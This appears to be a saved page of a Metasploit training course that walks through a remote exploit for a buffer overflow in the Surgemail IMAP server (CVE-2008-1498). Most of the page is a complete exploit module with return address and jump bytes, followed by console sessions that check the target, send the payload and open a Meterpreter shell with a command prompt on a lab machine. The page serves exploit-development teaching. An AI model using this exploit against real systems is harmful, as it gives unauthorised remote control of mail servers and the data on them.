<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Getting A Shell</title>
</head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Getting
A Shell</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">With what we have learned, we write the
exploit and save it to windows/imap/surgemail_list.rb.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">##<br># This file is part of the Metasploit Framework and may be subject to<br># redistribution and commercial restrictions. Please see the Metasploit<br># Framework web site for more information on licensing and terms of use.<br># http://metasploit.com/projects/Framework/<br>##<br><br><br>require 'msf/core'<br><br><br>class Metasploit3 &lt; Msf::Exploit::Remote<br><br>    include Msf::Exploit::Remote::Imap<br><br>    def initialize(info = {})<br>        super(update_info(info,   <br>            'Name'           =&gt; 'Surgemail 3.8k4-4 IMAPD LIST Buffer Overflow',<br>            'Description'    =&gt; %q{<br>                This module exploits a stack overflow in the Surgemail IMAP Server<br>                version 3.8k4-4 by sending an overly long LIST command. Valid IMAP<br>                account credentials are required.<br>            },<br>            'Author'         =&gt; [ 'ryujin' ],<br>            'License'        =&gt; MSF_LICENSE,<br>            'Version'        =&gt; '$Revision: 1 $',<br>            'References'     =&gt;<br>                [<br>                    [ 'BID', '28260' ],<br>                    [ 'CVE', '2008-1498' ],<br>                    [ 'URL', 'http://www.milw0rm.com/exploits/5259' ],<br>                ],<br>            'Privileged'     =&gt; false,<br>            'DefaultOptions' =&gt;<br>                {<br>                    'EXITFUNC' =&gt; 'thread',<br>                },<br>            'Payload'        =&gt;<br>                {<br>                    'Space'       =&gt; 10351,<br>                    'EncoderType' =&gt; Msf::Encoder::Type::AlphanumMixed,<br>                    'DisableNops' =&gt; true,<br>                    'BadChars'    =&gt; "\x00"<br>                },<br>            'Platform'       =&gt; 'win',<br>            'Targets'        =&gt;<br>                [<br>                    [ 'Windows Universal', { 'Ret' =&gt; "\x7e\x51\x78" } ], # p/p/r 0x0078517e<br>                ],<br>            'DisclosureDate' =&gt; 'March 13 2008',<br>            'DefaultTarget' =&gt; 0))<br>    end<br><br>    def check<br>        connect<br>        disconnect<br>        if (banner and banner =~ /(Version 3.8k4-4)/)<br>            return Exploit::CheckCode::Vulnerable<br>        end<br>        return Exploit::CheckCode::Safe<br>    end<br><br>    def exploit<br>        connected = connect_login<br>        nopes = "\x90"*(payload_space-payload.encoded.length) # to be fixed with make_nops()<br>        sjump = "\xEB\xF9\x90\x90"     # Jmp Back<br>        njump = "\xE9\xDD\xD7\xFF\xFF" # And Back Again Baby  ;)         <br>        evil = nopes + payload.encoded + njump + sjump + [target.ret].pack("A3")<br>        print_status("Sending payload")<br>        sploit = '0002 LIST () "/' + evil + '" "PWNED"' + "\r\n"<br>        sock.put(sploit)<br>        handler<br>        disconnect<br>    end<br><br>end</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">The most important things to notice
in the previous code are the following:
</span>
<dl style="color: rgb(0, 0, 0);">
  <dd>
    <ul>
      <li>We defined the maximum space for the shellcode (Space
=&gt; 10351) and set the DisableNops feature to disable the automatic
shellcode padding, we'll pad the payload on our own.
      </li>
      <li>We set the default encoder to the AlphanumMixed because of
the nature of the IMAP protocol.
      </li>
      <li>We defined our 3 bytes POP POP RET return address that will
be then referenced through the target.ret variable.
      </li>
      <li>We defined a check function which can check the IMAP server
banner in order to identify a vulnerable server and an exploit function
that obviously is the one that does most of the work.
      </li>
    </ul>
  </dd>
</dl>
<p style="color: rgb(0, 0, 0);">Let's see if it works:
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);"> msf &gt; search surgemail<br> [*] Searching loaded modules for pattern 'surgemail'...<br> <br> Exploits<br> ========<br> <br> Name                         Description                                  <br> ----                         -----------                                  <br> windows/imap/surgemail_list  Surgemail 3.8k4-4 IMAPD LIST Buffer Overflow <br> <br> <br> msf &gt; use windows/imap/surgemail_list<br> msf exploit(surgemail_list) &gt; show options<br> <br> Module options:<br> <br> Name      Current Setting  Required  Description                             <br> ----      ---------------  --------  -----------                             <br> IMAPPASS  test             no        The password for the specified username <br> IMAPUSER  test             no        The username to authenticate as         <br> RHOST     172.16.30.7      yes       The target address                      <br> RPORT     143              yes       The target port                         <br> <br> Payload options (windows/shell/bind_tcp):<br> <br> Name      Current Setting  Required  Description                          <br> ----      ---------------  --------  -----------                          <br> EXITFUNC  thread           yes       Exit technique: seh, thread, process <br> LPORT     4444             yes       The local port                       <br> RHOST     172.16.30.7      no        The target address                   <br> <br> Exploit target:<br> <br> Id  Name               <br> --  ----               <br> 0   Windows Universal</pre>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Some of the options are already
configured from our previous
session (see IMAPPASS, IMAPUSER and RHOST for example). Now we check
for the server version:
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);">msf exploit(surgemail_list) &gt; check<br><br>[*] Connecting to IMAP server 172.16.30.7:143...<br>[*] Connected to target IMAP server.<br>[+] The target is vulnerable.</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Yes! Now let's run the exploit
attaching the debugger to the
surgemail.exe process to see if the offset to overwrite SEH is correct:
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);">root@bt:~$ ./msfcli exploit/windows/imap/surgemail_list PAYLOAD=windows/shell/bind_tcp RHOST=172.16.30.7 IMAPPWD=test IMAPUSER=test E<br>[*] Started bind handler<br>[*] Connecting to IMAP server 172.16.30.7:143...<br>[*] Connected to target IMAP server.<br>[*] Authenticating as test with password test...<br>[*] Sending payload</pre>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:EXPLOIT04B.png"
 class="image"><img alt="EXPLOIT04B.png"
 src="http://www.offensive-security.com/w/images/8/8c/EXPLOIT04B.png"
 width="688" height="523"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
The offset is correct, we can now set a breakpoint at our return
address:
<br>
<br>
</p>
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:EXPLOIT04A.png"
 class="image"><img alt="EXPLOIT04A.png"
 src="http://www.offensive-security.com/w/images/3/39/EXPLOIT04A.png"
 width="666" height="500"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
Now we can redirect the execution flow into our buffer executing the
POP POP RET instructions:
<br>
<br>
</p>
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:EXPLOIT06.png"
 class="image"><img alt="EXPLOIT06.png"
 src="http://www.offensive-security.com/w/images/3/3c/EXPLOIT06.png"
 width="688" height="522"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
and finally execute the two jumps on the stack which will land us
inside our NOP sled:
<br>
<br>
</p>
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:EXPLOIT07.png"
 class="image"><img alt="EXPLOIT07.png"
 src="http://www.offensive-security.com/w/images/8/88/EXPLOIT07.png"
 width="688" height="522"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
So far so good, time to get our Meterpreter shell, let's rerun the
exploit without the debugger:
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">msf exploit(surgemail_list) &gt; set PAYLOAD windows/meterpreter/bind_tcp<br>PAYLOAD =&gt; windows/meterpreter/bind_tcp<br>msf exploit(surgemail_list) &gt; exploit<br><br>[*] Connecting to IMAP server 172.16.30.7:143...<br>[*] Started bind handler<br>[*] Connected to target IMAP server.<br>[*] Authenticating as test with password test...<br>[*] Sending payload<br>[*] Transmitting intermediate stager for over-sized stage...(191 bytes)<br>[*] Sending stage (2650 bytes)<br>[*] Sleeping before handling stage...<br>[*] Uploading DLL (75787 bytes)...<br>[*] Upload completed.<br>[*] Meterpreter session 1 opened (172.16.30.34:63937 -&gt; 172.16.30.7:4444)<br><br><u>meterpreter</u> &gt; execute -f cmd.exe -c -i<br>Process 672 created.<br>Channel 1 created.<br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>c:\surgemail&gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Success! We have fuzzed a vulnerable
server and built a custom exploit using the amazing features offered by
Metasploit.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Writing_An_Exploit"
 title="Writing An Exploit">Writing an Exploit</a></div>
</body>
</html>
